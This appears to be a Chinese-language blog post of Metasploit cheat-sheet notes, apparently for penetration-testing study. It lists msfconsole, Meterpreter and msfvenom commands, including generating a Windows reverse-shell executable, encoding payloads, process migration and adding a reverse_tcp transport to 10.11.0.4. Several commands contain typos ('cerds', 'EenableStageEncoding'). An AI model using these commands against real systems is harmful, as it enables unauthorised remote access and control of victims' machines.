    <div class="post-content">
        <p>1、Metasploit语法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start postgresql</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> postgresql</span><br><span class="line">sudo msfdb init  		//初始化数据库</span><br><span class="line">sudo apt update; sudo apt install metasploit-framework //更新msf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">runsudo msfconsole 		//启动</span><br><span class="line">show -h					//查看模块类型</span><br><span class="line">use &lt;moduleName&gt; 		//激活模块</span><br><span class="line">show options     		//查看模块使用参数</span><br><span class="line"><span class="built_in">set</span> &lt;ArgName&gt; &lt;Data&gt;    //设置模块参数</span><br><span class="line">setg                    //设置全局参数</span><br><span class="line">run						//运行模块</span><br><span class="line">exploit	-j				//后台执行payload</span><br><span class="line"><span class="built_in">jobs</span>					//显示后台服务</span><br><span class="line"><span class="built_in">jobs</span> -i &lt;ID&gt;			//显示执行信息</span><br><span class="line">background				//后台运行</span><br><span class="line">session -l				//列出可用会话</span><br><span class="line">session -j	&lt;ID&gt;		//进入会话</span><br></pre></td></tr></table></figure>

<hr>
<p>显示服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services</span><br></pre></td></tr></table></figure>

<p>扫描端口并且存入数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap [--save] [--<span class="built_in">help</span>] | [--<span class="built_in">help</span> | -h] [nmap options]</span><br></pre></td></tr></table></figure>

<p>显示发现的主机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hosts</span><br></pre></td></tr></table></figure>

<p>工作区间</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">workspace  //列出区间</span><br><span class="line">workspace &lt;spaceName&gt; //切换到指定区间</span><br><span class="line">workspace -A &lt;spaceName&gt; //添加区间</span><br><span class="line">workspace -D &lt;spaceName&gt; //删除工作区间</span><br></pre></td></tr></table></figure>

<hr>
<p>辅助模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show auxiliary				//列出辅助模块</span><br><span class="line">search <span class="built_in">type</span>:auxiliary name:&lt;Name&gt; //搜索auxiliary中的指定Name</span><br><span class="line">use &lt;moudleNmae&gt;			//使用模块</span><br><span class="line">info 						//查看详细信息</span><br><span class="line">services -p &lt;port&gt; --rhosts //自动将结果添加到rhosts</span><br><span class="line">cerds						//从数据库中获取凭据</span><br></pre></td></tr></table></figure>

<p>漏洞利用模块 大同小异 最好自己设置payloads</p>
<hr>
<p>Meterpreter</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>						/内置命令帮助手册</span><br><span class="line">sysinfo						/系统信息</span><br><span class="line">getuid						/获取当前用户</span><br><span class="line">upload 						/上传</span><br><span class="line">download					/下载</span><br><span class="line"><span class="built_in">pwd</span>							/获取当前所在目录路径</span><br><span class="line"><span class="built_in">cd</span>							/切换目录</span><br><span class="line"><span class="built_in">ls</span>							/列举目录文件</span><br><span class="line">shell						/启动一个shell </span><br><span class="line">execute -f &lt;processName&gt;	/启动一个程序</span><br><span class="line">ps							/列出进程列表</span><br><span class="line"><span class="built_in">kill</span>	&lt;pid&gt;				/终止进程</span><br></pre></td></tr></table></figure>

<p>msfvenom</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT&lt;PORT&gt; -f exe -o &lt;filename&gt; //生成exe文件</span><br><span class="line">-h			//显示帮助页面</span><br><span class="line">-p  		//指定paylaod</span><br><span class="line">-f			//指定文件生成格式</span><br><span class="line">-o			//指定文件输出路径</span><br><span class="line">-e			//指定编码格式</span><br><span class="line">-i			//指定编码的迭代次数</span><br><span class="line">-x			//指定一个executable文件作为模板</span><br><span class="line">-s			//指定payload载荷中的最 大长度</span><br><span class="line">-n			//为payload指定一个nopsled长度</span><br><span class="line">-b			//指定坏字符 例如<span class="string">&quot;&#x27;\x00\xff&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>进程迁移</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先查看进程列表 ps</span><br><span class="line">migrate &lt;PID&gt; //迁移至指定Process</span><br></pre></td></tr></table></figure>

<p>其他选项</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">multi/handler 				//多处理程序模块</span><br><span class="line">show advanced   //显示其他选项</span><br><span class="line"><span class="built_in">set</span> EenableStageEncoding <span class="literal">true</span> //设置将分段的shellcode一同进行编码</span><br><span class="line"><span class="built_in">set</span> StageEncoder &lt;Encoding&gt;	  //设置编码器</span><br><span class="line">transport list				  //列出传输清单</span><br><span class="line">transport add -t reverse_tcp -l 10.11.0.4 -p 5555 //添加新的传输协议与端口</span><br><span class="line">transport next				  //创建新会话 关闭旧会话</span><br></pre></td></tr></table></figure>
